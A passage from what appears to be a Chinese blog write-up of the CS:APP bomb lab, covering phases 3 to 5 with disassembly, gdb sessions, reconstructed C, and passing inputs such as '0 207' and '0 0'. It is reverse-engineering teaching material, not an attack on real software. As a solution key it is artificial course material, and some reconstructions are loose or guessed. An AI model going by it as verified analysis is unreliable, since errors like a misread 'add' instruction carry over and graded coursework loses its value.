，那么就不可能从那儿执行到这儿来，因为炸弹爆炸了，所以他后面的代码也不可能执行，所以我们只需要看看哪些代码会跳转到这一条 ( <code>400fad</code> ) 上来。</p>\n<pre><code>  400f6a:\t83 7c 24 08 07       \tcmpl   $0x7,0x8(%rsp)\n  400f6f:\t77 3c                \tja     400fad &lt;phase_3+0x6a&gt;\n</code></pre>\n<p>这段代码出现在我们获取了两个整数之后。这段代码比较了 <code>*(rsp + 8)</code>  和 <code>0x7</code>  的值。为了不跳转到 <code>400fad</code> ，我们需要让 <code>%rsp + 8 &lt;= 0x7</code> 。第二个要求明确了。</p>\n<p>最后一个炸弹前的代码如下：</p>\n<pre><code>  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>这段代码中实现如下操作：</p>\n<ol>\n<li>eax = 0x137</li>\n<li>如果 <code>eax != *(rsp + 12)</code> ，那么炸弹爆炸，也就是说输入的第二个参数最后必须等于 <code>0x137</code></li>\n</ol>\n<p>现在问题来了，有几个代码通过跳转来到了 <code>400fbe</code>  位置，我们需要分析其情况，看看其是否对 <code>%rsp + 12</code>  处的值做了操作。</p>\n<pre><code>  400f7c:\tb8 cf 00 00 00       \tmov    $0xcf,%eax -&gt;eax = 0xcf\n  400f81:\teb 3b                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f83:\tb8 c3 02 00 00       \tmov    $0x2c3,%eax -&gt; eax = 0x2c3\n  400f88:\teb 34                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f8a:\tb8 00 01 00 00       \tmov    $0x100,%eax -&gt; eax = 0x100\n  400f8f:\teb 2d                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f91:\tb8 85 01 00 00       \tmov    $0x185,%eax -&gt; eax = 0x185\n  400f96:\teb 26                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f98:\tb8 ce 00 00 00       \tmov    $0xce,%eax -&gt; eax = 0xce\n  400f9d:\teb 1f                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f9f:\tb8 aa 02 00 00       \tmov    $0x2aa,%eax -&gt; eax = 0x2aa\n  400fa4:\teb 18                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fa6:\tb8 47 01 00 00       \tmov    $0x147,%eax -&gt; eax = 0x147\n  400fab:\teb 11                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fb2:\tb8 00 00 00 00       \tmov    $0x0,%eax -&gt; eax = 0\n  400fb7:\teb 05                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax -&gt; eax = 0x137\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>要注意的是指令 <code>400f75:\tff 24 c5 70 24 40 00 \tjmpq   *0x402470(,%rax,8)</code>  中实现的是间接跳转（因为加了 <code>*</code> ），那么我们需要找到 <code>0x402470</code>  处的 8 字节地址，以它为跳转的基地址。</p>\n<pre><code>(gdb) x/wx 0x402470\n0x402470:       0x00400f7c\n</code></pre>\n<p>这个地址就是 <code>0x400f7c</code> 。我们前面把输入的第一个数字移到了 <code>%eax</code> ，那么我们需要通过 <code>0x400f7c + 8 * %eax</code>  来确定我们的跳转目标。跳转以后会赋给 <code>%eax</code>  相应的值，而后我们需要保证我们输入的第二个数等于 <code>%eax</code> 。</p>\n<p>这样逻辑就捋顺了，整个代码应该是一个 <code>switch_case</code>  的结构，而 <code>0x400f7c</code>  就是这个跳转表的首地址， <code>%eax</code>  是对应的索引。这个 <code>phase</code>  的要求就是：</p>\n<ol>\n<li>输入 2 个整数</li>\n<li>第一个整数必须小于等于 0x7，因为最多只有 7 个 <code>case</code></li>\n<li>输入的第二个数必须和其 <code>case</code>  中赋给 <code>%eax</code>  的值相同</li>\n</ol>\n<p>我们设计第一个数是 <code>0</code> ，那么第二个数就是 <code>0xcf</code> ( <code>207</code> )，我们试一试：</p>\n<pre><code>main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at bomb.c:90\n90          /* I guess this is too easy so far.  Some more complex code will\n(gdb) n\n91           * confuse people. */\n(gdb) n\nHalfway there!\n94          phase_defused();\n</code></pre>\n<p>成功！</p>\n<h2 id=\"phase4-分析递归\"><a class=\"markdownIt-Anchor\" href=\"#phase4-分析递归\">#</a> phase4 分析：递归</h2>\n<p>首先还是对 <code>phase_4</code>  进行了反汇编：</p>\n<pre><code>000000000040100c &lt;phase_4&gt;:\n  40100c:\t48 83 ec 18          \tsub    $0x18,%rsp\n  401010:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  401015:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  40101a:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  40101f:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401024:\te8 c7 fb ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  401029:\t83 f8 02             \tcmp    $0x2,%eax\n  40102c:\t75 07                \tjne    401035 &lt;phase_4+0x29&gt;\n\n  40102e:\t83 7c 24 08 0e       \tcmpl   $0xe,0x8(%rsp)\n  401033:\t76 05                \tjbe    40103a &lt;phase_4+0x2e&gt;\n  401035:\te8 00 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  40103a:\tba 0e 00 00 00       \tmov    $0xe,%edx\n  40103f:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401044:\t8b 7c 24 08          \tmov    0x8(%rsp),%edi\n  401048:\te8 81 ff ff ff       \tcallq  400fce &lt;func4&gt;\n  40104d:\t85 c0                \ttest   %eax,%eax\n  40104f:\t75 07                \tjne    401058 &lt;phase_4+0x4c&gt;\n  401051:\t83 7c 24 0c 00       \tcmpl   $0x0,0xc(%rsp)\n  401056:\t74 05                \tje     40105d &lt;phase_4+0x51&gt;\n\n  401058:\te8 dd 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  40105d:\t48 83 c4 18          \tadd    $0x18,%rsp\n  401061:\tc3                   \tretq\n</code></pre>\n<p>在本代码中进行了如下过程：</p>\n<ol>\n<li>预留出 24 个字节的空间</li>\n<li>rcx = rsp + 12</li>\n<li>rdx = rsp + 8</li>\n<li>esi = 0x4025cf</li>\n<li>eax = 0</li>\n<li>sscanf 调用</li>\n<li>下面是带分支部分：</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">!=</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    call bomb_explode</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arg3 <span class=\"token operator\">></span> <span class=\"token number\">0xe</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    call bomb_explode</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>edx <span class=\"token operator\">=</span> <span class=\"token number\">0xe</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>esi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>edi <span class=\"token operator\">=</span> arg3</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span>arg3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    call bomb_explode</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arg2 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    call bomb_explode</pre></td></tr></table></figure><p>这里出现了非常熟悉的 <code>sscanf</code>  调用，我们先看看 <code>0x4025cf</code>  处是啥（如果不出意外应该是 <code>%d %d</code> ）</p>\n<pre><code>(gdb) x/s 0x4025cf\n0x4025cf:       &quot;%d %d&quot;\n</code></pre>\n<p>果然！果然！是让我们输入 2 个整数，如果不是两个的话就爆炸！此外，一开始的 <code>arg3</code>  应该小于等于 <code>0xe</code> ，否则爆炸，此外函数 <code>func4</code>  返回的 <code>eax</code>  应该为 0，否则爆炸。此外， <code>*(rsp + 12)</code> （如果 <code>func4</code>  里面没改变这个值的话应该还是 <code>arg2</code> ）必须等于 0。</p>\n<p>那么我们来分析一下 <code>func4</code> ：</p>\n<pre><code>0000000000400fce &lt;func4&gt;:\n  400fce:\t48 83 ec 08          \tsub    $0x8,%rsp\n  400fd2:\t89 d0                \tmov    %edx,%eax\n  400fd4:\t29 f0                \tsub    %esi,%eax\n  400fd6:\t89 c1                \tmov    %eax,%ecx\n  400fd8:\tc1 e9 1f             \tshr    $0x1f,%ecx\n  400fdb:\t01 c8                \tadd    %ecx,%eax\n  400fdd:\td1 f8                \tsar    %eax\n  400fdf:\t8d 0c 30             \tlea    (%rax,%rsi,1),%ecx\n  400fe2:\t39 f9                \tcmp    %edi,%ecx\n  400fe4:\t7e 0c                \tjle    400ff2 &lt;func4+0x24&gt;\n\n  400fe6:\t8d 51 ff             \tlea    -0x1(%rcx),%edx\n  400fe9:\te8 e0 ff ff ff       \tcallq  400fce &lt;func4&gt;\n  400fee:\t01 c0                \tadd    %eax,%eax\n  400ff0:\teb 15                \tjmp    401007 &lt;func4+0x39&gt;\n\n  400ff2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400ff7:\t39 f9                \tcmp    %edi,%ecx\n  400ff9:\t7d 0c                \tjge    401007 &lt;func4+0x39&gt;\n\n  400ffb:\t8d 71 01             \tlea    0x1(%rcx),%esi\n  400ffe:\te8 cb ff ff ff       \tcallq  400fce &lt;func4&gt;\n  401003:\t8d 44 00 01          \tlea    0x1(%rax,%rax,1),%eax\n\n  401007:\t48 83 c4 08          \tadd    $0x8,%rsp\n  40100b:\tc3                   \tretq\n</code></pre>\n<p>看起来有点长，但是不要惊慌！这里只有 3 个跳转，而且其中两个都是跳转到最后恢复栈的位置。其主要步骤如下：</p>\n<ol>\n<li>分配 8 个字节的栈空间</li>\n<li>eax = edx</li>\n<li>eax -= esi<br>\n-&gt; eax = edx - esi</li>\n<li>ecx = eax</li>\n<li>ecx &gt;&gt; 31<br>\n-&gt; ecx = eax &gt;&gt; 31 (eax 符号位拉满)</li>\n<li>eax += ecx</li>\n<li>eax &gt;&gt; 1<br>\n-&gt; eax = (eax + ecx) &gt;&gt; 1</li>\n<li>ecx = rax + rsi</li>\n<li>下面进入一段分支：</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ecx <span class=\"token operator\">&lt;=</span> edi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">//400ff2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ecx <span class=\"token operator\">>=</span> edi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// 401007</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        esi <span class=\"token operator\">=</span> rcx <span class=\"token operator\">+</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        ret <span class=\"token operator\">=</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span>arg3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        eax <span class=\"token operator\">=</span> rax <span class=\"token operator\">+</span> rax <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    edx <span class=\"token operator\">=</span> rcx <span class=\"token operator\">-</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    ret <span class=\"token operator\">=</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span>arg3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    eax <span class=\"token operator\">=</span> eax <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>分析 <code>func4</code> ，我们不难发现，该函数的传入参数是 <code>%edx</code>  和 <code>%esi</code> ，此外该函数是个递归函数。函数总的过程应该如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>eax <span class=\"token operator\">=</span> edx <span class=\"token operator\">-</span> esi</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ecx <span class=\"token operator\">=</span> eax <span class=\"token operator\">>></span> <span class=\"token number\">31</span> <span class=\"token punctuation\">(</span>逻辑右移<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>eax <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>eax <span class=\"token operator\">+</span> ecx<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>算数右移<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ecx <span class=\"token operator\">=</span> rax <span class=\"token operator\">+</span> rsi</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ecx <span class=\"token operator\">&lt;=</span> edi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ecx <span class=\"token operator\">>=</span> edi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token comment\">// 401007</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>       <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>       esi <span class=\"token operator\">=</span> rcx <span class=\"token operator\">+</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>       ret <span class=\"token operator\">=</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span>arg3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       eax <span class=\"token operator\">=</span> rax <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   edx <span class=\"token operator\">=</span> rcx <span class=\"token operator\">-</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   ret <span class=\"token operator\">=</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span>arg3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   eax <span class=\"token operator\">=</span> eax <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>经过变量调整重写的 C 版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ret <span class=\"token operator\">=</span> arg3 <span class=\"token operator\">-</span> arg2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mid <span class=\"token operator\">=</span> ret <span class=\"token operator\">>></span> <span class=\"token number\">31</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ret <span class=\"token operator\">+</span> ret <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mid <span class=\"token operator\">=</span> ret <span class=\"token operator\">+</span> arg2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>mid <span class=\"token operator\">&lt;=</span> arg1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>mid <span class=\"token operator\">>=</span> arg1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">//    arg2 = mid + 1;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>arg3<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">//    arg3 = mid - 1;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token function\">func4</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">,</span>arg2<span class=\"token punctuation\">,</span>mid <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们看看什么情况下 <code>eax = 0</code> 。（这到底是什么东西啊摔！）真没看懂是什么东西，试了个 <code>0 0</code> ，通过了，先 mark 一下，后面再来检验：</p>\n<pre><code>(gdb)\n0 0\n95          printf(&quot;Halfway there!\\n&quot;);\n</code></pre>\n<h2 id=\"phase5-分析-canary循环与-ascii-编码字符串\"><a class=\"markdownIt-Anchor\" href=\"#phase5-分析-canary循环与-ascii-编码字符串\">#</a> phase5 分析:  <code>canary</code> ，循环与 ASCII 编码字符串</h2>\n<pre><code>(gdb)\n97          /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */\n</code></pre>\n<p>数学不好呜呜呜。</p>\n<p>phase_5 的反汇编代码如下：</p>\n<pre><code>0000000000401062 &lt;phase_5&gt;:\nseg1:\n  401062:\t53                   \tpush   %rbx\n  401063:\t48 83 ec 20          \tsub    $0x20,%rsp\n  401067:\t48 89 fb             \tmov    %rdi,%rbx\n  40106a:\t64 48 8b 04 25 28 00 \tmov    %fs:0x28,%rax\n  401071:\t00 00\n  401073:\t48 89 44 24 18       \tmov    %rax,0x18(%rsp)\n  401078:\t31 c0                \txor    %eax,%eax\n  40107a:\te8 9c 02 00 00       \tcallq  40131b &lt;string_length&gt;\n  40107f:\t83 f8 06             \tcmp    $0x6,%eax\n  401082:\t74 4e                \tje     4010d2 &lt;phase_5+0x70&gt;\n  401084:\te8 b1 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  401089:\teb 47                \tjmp    4010d2 &lt;phase_5+0x70&gt;\nseg2:\n  40108b:\t0f b6 0c 03          \tmovzbl (%rbx,%rax,1),%ecx\n  40108f:\t88 0c 24             \tmov    %cl,(%rsp)\n  401092:\t48 8b 14 24          \tmov    (%rsp),%rdx\n  401096:\t83 e2 0f             \tand    $0xf,%edx\n  401099:\t0f b6 92 b0 24 40 00 \tmovzbl 0x4024b0(%rdx),%edx\n  4010a0:\t88 54 04 10          \tmov    %dl,0x10(%rsp,%rax,1)\n  4010a4:\t48 83 c0 01          \tadd    $0x1,%rax\n  4010a8:\t48 83 f8 06          \tcmp    $0x6,%rax\n  4010ac:\t75 dd                \tjne    40108b &lt;phase_5+0x29&gt;\n  4010ae:\tc6 44 24 16 00       \tmovb   $0x0,0x16(%rsp)\n  4010b3:\tbe 5e 24 40 00       \tmov    $0x40245e,%esi\n  4010b8:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  4010bd:\te8 76 02 00 00       \tcallq  401338 &lt;strings_not_equal&gt;\n  4010c2:\t85 c0                \ttest   %eax,%eax\n  4010c4:\t74 13                \tje     4010d9 &lt;phase_5+0x77&gt;\n  4010c6:\te8 6f 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  4010cb:\t0f 1f 44 00 00       \tnopl   0x0(%rax,%rax,1)\n  4010d0:\teb 07                \tjmp    4010d9 &lt;phase_5+0x77&gt;\nseg3:\n  4010d2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  4010d7:\teb b2                \tjmp    40108b &lt;phase_5+0x29&gt;\nseg4:\n  4010d9:\t48 8b 44 24 18       \tmov    0x18(%rsp),%rax\n  4010de:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n  4010e5:\t00 00\n  4010e7:\t74 05                \tje     4010ee &lt;phase_5+0x8c&gt;\n  4010e9:\te8 42 fa ff ff       \tcallq  400b30 &lt;__stack_chk_fail@plt&gt;\nseg5:\n  4010ee:\t48 83 c4 20          \tadd    $0x20,%rsp\n  4010f2:\t5b                   \tpop    %rbx\n  4010f3:\tc3                   \tretq\n</code></pre>\n<p>整个过程还原为 C 语言如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 这个函数的参数是： % rdi</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">phase5</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 保存 rbx</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 留出 32 个字节的空间</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    rbx <span class=\"token operator\">=</span> rdi <span class=\"token comment\">//buf 的地址保存在 rbx 中</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rsp <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> canary</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\">// 返回值 = 0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    call string_length <span class=\"token comment\">// 返回字符串长度</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">==</span> <span class=\"token number\">0x6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\teax <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token comment\">// //seg2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token comment\">// ecx = *(rbx + rax)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token comment\">// *rsp = cl</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token comment\">// rdx = *rsp</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token comment\">// edx = edx &amp; 0xf</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token comment\">// edx = *(rdx + 0x4024b0)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token comment\">// *(rsp + rax + 16) = dl</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\">// rax = rax &amp; 0x1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// if(rax != 0x6)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token comment\">// \tjump to seg2</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td 